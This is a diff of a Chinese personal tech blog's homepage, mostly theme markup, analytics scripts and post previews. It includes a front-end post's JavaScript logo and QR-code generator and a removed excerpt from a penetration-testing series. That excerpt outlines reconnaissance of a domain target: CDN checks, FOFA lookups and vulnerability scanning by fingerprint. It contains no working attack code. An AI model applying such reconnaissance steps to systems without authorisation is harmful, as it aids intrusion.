class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入 qrcode.js 库 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;qrcode.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>输入文字生成文字 logo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;companyName&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入文字名称&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;generateLogo()&quot;</span>&gt;</span>生成 logo<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;downloadButton&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;downloadLogo()&quot;</span>&gt;</span>下载 logo<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;logo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 新增输入框和按钮用于生成二维码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>输入信息生成二维码<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;companyName2&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入title&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;address&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入信息&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;22&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;generateQRCode()&quot;</span>&gt;</span>生成二维码<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;qrcode&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;companyNameDisplay&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">generateLogo</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> companyName = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;companyName&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> logoElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;logo&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (companyName.<span class="property">length</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                logoElement.<span class="property">textContent</span> = <span class="string">`<span class="subst">$&#123;companyName.slice(<span class="number">0</span>, <span class="number">2</span>)&#125;</span>\n<span class="subst">$&#123;companyName.slice(<span class="number">2</span>)&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                logoElement.<span class="property">textContent</span> = companyName;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> randomColor = <span class="string">&#x27;#&#x27;</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">16777215</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span></span><br><span class="line"><span class="language-javascript">            logoElement.<span class="property">style</span>.<span class="property">backgroundColor</span> = randomColor;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">downloadLogo</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;logoCanvas&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> logoElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;logo&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> text = logoElement.<span class="property">textContent</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> color = logoElement.<span class="property">style</span>.<span class="property">backgroundColor</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 设置字体样式，与页面上的 logo 字体大小一致</span></span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="property">font</span> = <span class="string">&#x27;748px Arial&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="property">textAlign</span> = <span class="string">&#x27;center&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="property">textBaseline</span> = <span class="string">&#x27;middle&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 清空画布</span></span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">clearRect</span>(<span class="number">0</span>, <span class="number">0</span>, canvas.<span class="property">width</span>, canvas.<span class="property">height</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 绘制带圆角的背景</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> radius = <span class="number">200</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> x = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> y = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> width = <span class="number">2048</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> height = <span class="number">2048</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">beginPath</span>();</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">moveTo</span>(x + radius, y);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">lineTo</span>(x + width - radius, y);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">quadraticCurveTo</span>(x + width, y, x + width, y + radius);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">lineTo</span>(x + width, y + height - radius);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">quadraticCurveTo</span>(x + width, y + height, x + width - radius, y + height);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">lineTo</span>(x + radius, y + height);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">quadraticCurveTo</span>(x, y + height, x, y + height - radius);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">lineTo</span>(x, y + radius);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">quadraticCurveTo</span>(x, y, x + radius, y);</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">closePath</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="property">fillStyle</span> = color;</span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="title function_">fill</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 设置文字颜色</span></span></span><br><span class="line"><span class="language-javascript">            ctx.<span class="property">fillStyle</span> = <span class="string">&#x27;white&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 计算文字位置</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> centerX = canvas.<span class="property">width</span> / <span class="number">2</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> centerY = canvas.<span class="property">height</span> / <span class="number">2</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 绘制文字</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (text.<span class="title function_">includes</span>(<span class="string">&#x27;\n&#x27;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> lines = text.<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> lineHeight = <span class="number">748</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> totalHeight = lines.<span class="property">length</span> * lineHeight;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> startY = centerY - totalHeight / <span class="number">2</span> + lineHeight / <span class="number">2</span>;</span></span><br><span class="line"><span class="language-javascript">                lines.<span class="title function_">forEach</span>(<span class="function">(<span class="params">line, index</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    ctx.<span class="title function_">fillText</span>(line, centerX, startY + index * lineHeight);</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                ctx.<span class="title function_">fillText</span>(text, centerX, centerY);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 创建下载链接</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> link = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            link.<span class="property">href</span> = canvas.<span class="title function_">toDataURL</span>(<span class="string">&#x27;image/png&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            link.<span class="property">download</span> = companyName + <span class="string">&#x27;logo.png&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            link.<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">generateQRCode</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> address = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;address&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> qrcodeDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;qrcode&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> companyName2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;companyName2&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> companyNameDisplay = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;companyNameDisplay&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            qrcodeDiv.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            companyNameDisplay.<span class="property">textContent</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (address) &#123;</span></span><br><span class="line"><span class="language-javascript">                qrcode.<span class="property">stringToBytes</span> = qrcode.<span class="property">stringToBytesFuncs</span>[<span class="string">&#x27;UTF-8&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> qr = <span class="title function_">qrcode</span>(<span class="number">0</span>, <span class="string">&#x27;L&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                qr.<span class="title function_">addData</span>(address);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// qr.addData(unescape(encodeURIComponent(address)));</span></span></span><br><span class="line"><span class="language-javascript">                qr.<span class="title function_">make</span>();</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> img = qr.<span class="title function_">createImgTag</span>(<span class="number">4</span>);</span></span><br><span class="line"><span class="language-javascript">                qrcodeDiv.<span class="property">innerHTML</span> = img;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (companyName2) &#123;</span></span><br><span class="line"><span class="language-javascript">                companyNameDisplay.<span class="property">textContent</span> = companyName2;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/04/15/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E4%BF%A1%E6%81%AF%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81%E8%AE%A9%E5%BE%AE%E4%BF%A1%E8%83%BD%E5%A4%9F%E6%89%AB%E7%A0%81%E8%AF%86%E5%88%AB%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/01/29/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89-%E6%B8%97%E9%80%8F%E6%AD%A5%E9%AA%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/01/29/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89-%E6%B8%97%E9%80%8F%E6%AD%A5%E9%AA%A4/" class="post-title-link" itemprop="url">无星的渗透之旅速成篇（十一）-渗透步骤</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-01-29 20:09:00" itemprop="dateCreated datePublished" datetime="2025-01-29T20:09:00+08:00">2025-01-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-07-31 15:15:55" itemprop="dateModified" datetime="2025-07-31T15:15:55+08:00">2025-07-31</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/01/29/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89-%E6%B8%97%E9%80%8F%E6%AD%A5%E9%AA%A4/" class="post-meta-item leancloud_visitors" data-flag-title="无星的渗透之旅速成篇（十一）-渗透步骤" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>54</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <ol>
-<li>针对单域名靶标</li>
-</ol>
-<p>判断是否存在cdn</p>
-<p>多地ping</p>
-<ol start="2">
-<li>没有cdn</li>
-</ol>
-<p>把ip拿到fofa看下</p>
-<p>指纹里有什么</p>
-<ol start="3">
-<li>针对指纹进行漏洞扫描</li>
-</ol>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/01/29/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89-%E6%B8%97%E9%80%8F%E6%AD%A5%E9%AA%A4/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
-
-
-
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?bdba6c3bda62a07f58f3cf06034704d5";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-5976024V60"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-5976024V60')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-5976024V60', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: 无星","link":"链接: ","source":"来源: 歪比巴卜","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '歪比巴卜',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/rss2.xml" title="歪比巴卜" type="application/rss+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/Avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">183</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">33</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/Avatar.jpg" alt="Logo"><span class="site-name">歪比巴卜</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="site-info"><h1 id="site-title">歪比巴卜</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/XingXiaoWu" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://juejin.cn/user/1503787636493886" target="_blank" title="掘金"><i class="fab fa-blogger" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://www.jianshu.com/u/fef7696741c8" target="_blank" title="简书"><i class="fas fa-blog" style="color: #hdhfbb;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="post_cover left"><a href="/2025/10/21/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94Lottie%E5%8A%A8%E6%80%81%E6%9B%B4%E6%8D%A2%E6%96%87%E5%AD%97%E9%97%AE%E9%A2%98/" title="无星的前端之旅（三十五）——Lottie动态更换文字问题"><img class="post-bg" src="/img/cover/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无星的前端之旅（三十五）——Lottie动态更换文字问题"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/10/21/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94Lottie%E5%8A%A8%E6%80%81%E6%9B%B4%E6%8D%A2%E6%96%87%E5%AD%97%E9%97%AE%E9%A2%98/" title="无星的前端之旅（三十五）——Lottie动态更换文字问题">无星的前端之旅（三十五）——Lottie动态更换文字问题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-10-21T10:24:00.000Z" title="发表于 2025-10-21 18:24:00">2025-10-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a></span></div><div class="content">背景今天我们来解决一个Lottie动态更换文字的问题 比如有个抽奖动画，我们需要动态替换抽奖的奖品，这种需求在实际项目中还是比较常见的 这里我们有两种方式 1. 设计师比较顶让设计师在静态字体处预留出一个占位符，然后在js加载时，动态替换这个占位符 比如 Lottie.json 1&#123;&quot;v&quot;:&quot;5.5.9&quot;,&quot;fr&quot;:24,&quot;ip&quot;:0,&quot;op&quot;:72,&quot;w&quot;:200,&quot;h&quot;:200,&quot;nm&quot;:&quot;合成 2&quot;,&quot;ddd&quot;:0,&quot;assets&quot;:[&#123;&quot;id&quot;:&quot;comp_0&quot;,&quot;layers&quot;:[&#123;&quot;ddd&quot;:0,&quot;ind&quot;:1,&quot;ty&quot;:5,&quot;nm&quot;:&quot;textnode&quot;,&quo...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/10/15/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/gitea%E7%9A%84%E5%AE%89%E8%A3%85/" title="gitea的安装"><img class="post-bg" src="/img/cover/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="gitea的安装"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/10/15/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/gitea%E7%9A%84%E5%AE%89%E8%A3%85/" title="gitea的安装">gitea的安装</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-10-15T05:13:32.000Z" title="发表于 2025-10-15 13:13:32">2025-10-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/iOS/">iOS</a></span></div><div class="content">Ubuntu 安装 gitea二进制安装1. 下载1234mkdir giteacd giteawget -O gitea https://dl.gitea.com/gitea/main-nightly/gitea-main-nightly-linux-amd64chmod +x gitea  2. 注册用户12345678adduser \   --system \   --shell /bin/bash \   